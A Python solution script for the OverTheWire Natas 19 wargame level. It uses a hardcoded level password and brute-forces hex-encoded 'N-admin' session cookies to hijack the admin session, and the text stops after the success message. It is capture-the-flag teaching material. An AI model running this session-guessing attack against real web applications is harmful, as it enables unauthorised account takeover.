#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import binascii
import re
import time
from requests.auth import HTTPBasicAuth
import requests

username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()
auth = HTTPBasicAuth(username, password)

start = 1
end = 640  # adjust if you want a different range
success_marker = "You are an admin"
pw_regex = re.compile(r"([A-Za-z0-9]{32})")

for i in range(start, end + 1):
    # build the admin token like "89-admin" and hex-encode it
    token = f"{i}-admin".encode("utf-8")
    hex_token = binascii.hexlify(token).decode("ascii")
    cookies = {"PHPSESSID": hex_token}

    try:
        resp = session.get(url, cookies=cookies, auth=auth, timeout=8)
    except requests.RequestException as e:
        print(f"[!] Request error for i={i}: {e}")
        time.sleep(1)
        continue

    content = resp.text
    if success_marker in content:
        print(f"[+] Found admin session! i = {i}, PHPSESSID = {hex_token}")
       
